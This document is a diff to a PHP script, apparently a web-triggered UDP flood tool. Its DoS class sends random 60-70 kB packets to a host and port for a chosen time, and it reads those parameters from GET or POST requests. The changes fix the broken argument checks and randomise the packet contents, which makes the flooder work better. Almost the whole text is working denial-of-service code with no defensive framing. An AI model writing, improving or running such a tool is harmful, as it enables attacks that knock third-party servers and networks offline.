@@ -28,7 +28,10 @@ error_reporting(E_ERROR | E_WARNING);
 
 ini_set('max_execution_time', 0);
 
-class DoS {
+class DoS
+{
+    const MIN_PACKET_SIZE = 61440; // 60 kB
+    const MAX_PACKET_SIZE = 71680; // 70 kB
 
     /**
      * Target host, e.g. 127.0.0.1
@@ -49,106 +52,140 @@ class DoS {
     private $time;
 
     /**
-     * Packet size in bytes
-     * @var int
-     */
-    private $size;
-
-    /**
      * DoS constructor.
      * @param $host string Target host
-     * @param $port int Target port
-     * @param $time int Flood time in Seconds
-     * @param $size int Packet size in bytes
+     * @param $port int target port
+     * @param $time int flood time in Seconds
      */
-    public function __construct($host, $port, $time, $size)
+    public function __construct($host, $port, $time)
     {
-        Preconditions::checkArgument(!filter_var($host, FILTER_VALIDATE_IP), "host missing or incorrect format");
-        Preconditions::checkArgument(!filter_var($port, FILTER_VALIDATE_INT), "port incorrect format");
-        Preconditions::checkArgument(!filter_var($time, FILTER_VALIDATE_INT), "time missing or incorrect format");
-        Preconditions::checkArgument(!filter_var($size, FILTER_VALIDATE_INT), "size incorrect format");
+        Preconditions::checkArgument(filter_var($host, FILTER_VALIDATE_IP), "host missing or incorrect format");
+        Preconditions::checkArgument(filter_var($port, FILTER_VALIDATE_INT), "port incorrect format");
+        Preconditions::checkArgument(filter_var($time, FILTER_VALIDATE_INT), "time missing or incorrect format");
 
         $this->host = $host;
         $this->port = $port;
         $this->time = $time;
-        $this->size = $size;
     }
 
     /**
-     * Starts UPD attack
-     * @return int Amount of bytes sent
-     * @throws Exception
+     * Starts an UPD attack
+     * @throws Exception on socket error
      */
-    public function flood() {
-        /** @var string $packet */
-        //$packet = openssl_random_pseudo_bytes($this->size);
-        $packet = str_repeat("\x00", $this->size);
+    public function flood()
+    {
+        $packets = $this->generatePackets(1337);
 
-        /** @var int $startTime */
-        $startTime = time();
+        $endTime = time() + $this->time;
 
-        /** @var int $endTime */
-        $endTime = $startTime + $this->time;
-
-        /** @var resource $socket */
         $socket = @fsockopen("udp://$this->host", $this->port, $errorNumber, $errorMessage, 30);
-        if(!$socket) {
+        if (!$socket) {
             throw new Exception($errorMessage);
         }
 
-        for($packets = 1; time() <= $endTime; ++$packets)
-        {
-            @fwrite($socket, $packet);
+        while(time() <= $endTime) {
+            @fwrite($socket, $packets[array_rand($packets)]);
         }
         @fclose($socket);
+    }
 
+    private function generatePackets($size) {
+        $random = Random::get();
+
+        $packets = array();
+        for ($i = 0; $i < $size; $i++) {
+            $length = mt_rand(DoS::MIN_PACKET_SIZE, Dos::MAX_PACKET_SIZE);
+            $packets[] = $random->string($length);
+        }
         return $packets;
     }
 }
 
-class Preconditions {
-
+class Preconditions
+{
     /**
      * Ensures the truth of an expression involving one or more parameters to the calling method.
-     * @param $expression boolean A boolean expression
-     * @param $errorMessage string The exception message to use if the check fails
-     * @throws InvalidArgumentException If expression is false
+     * @param $expression boolean a boolean expression
+     * @param $errorMessage string the exception message to use if the check fails
+     * @throws InvalidArgumentException if expression is false
      */
-    public static function checkArgument($expression, $errorMessage) {
-        if($expression) {
+    public static function checkArgument($expression, $errorMessage)
+    {
+        if (!$expression) {
             throw new InvalidArgumentException($errorMessage);
         }
     }
 }
 
-class Application {
+interface IRandom
+{
+    /**
+     * Creates a random string whose length is the number of characters specified.
+     * @min $length int lowest value to be returned
+     * @max $length int highest value to be returned
+     * @return string the random string
+     */
+    public function string($length);
+}
 
-    public static function start($args) {
+class ShuffleRandom implements IRandom
+{
+    public function string($length)
+    {
+        return str_shuffle(substr(str_repeat(md5(mt_rand()), 2 + $length / 32), 0, $length));
+    }
+}
 
-        if(sizeof($args) === 0) {
+class OpenSSLRandom implements IRandom
+{
+    public function string($length)
+    {
+        return bin2hex(openssl_random_pseudo_bytes($length / 2));
+    }
+}
+
+class Random
+{
+    /**
+     * Creates a random generator depending on the PHP version
+     * @return IRandom the random generator
+     */
+    public static function get()
+    {
+        // openssl_random_pseudo_bytes is the fastest way to generate a random string
+        if (function_exists("openssl_random_pseudo_bytes")) {
+            return new OpenSSLRandom();
+        } else {
+            return new ShuffleRandom();
+        }
+    }
+}
+
+class Application
+{
+    public static function start($args)
+    {
+        if (sizeof($args) === 0) {
             echo json_encode(array("status" => "ok"));
             return;
         }
 
         $host = $args['host'];
         $port = isset($args['port']) ? $args['port'] : 80;
-        $time = $args['time'];
-        $size = isset($args['size']) ? $args['size'] : (1024 * 64); // 64 kB
+        $time = isset($args['time']) ? $args['time'] : 60;
 
         $result = null;
         try {
-            $dos = new DoS($host, $port, $time, $size);
-            $packets = $dos->flood();
+            $dos = new DoS($host, $port, $time);
+            $dos->flood();
 
-            $pps = intval($packets / $time);
-            $mbps = intval($packets * $size / 1024 / 1024 / $time);
-            $result = array("success" => "true", "pps" => $pps, "mbps" => $mbps);
+            $result = array("success" => "true");
         } catch (Exception $e) {
-            $result = array("success" => "false", "error" => $e->getMessage());
+            $result = array("success" => "false", "message" => $e->getMessage());
         }
 
         echo json_encode($result);
     }
 }
 
-Application::start($_GET);
+Application::start($_POST ? $_POST : $_GET);
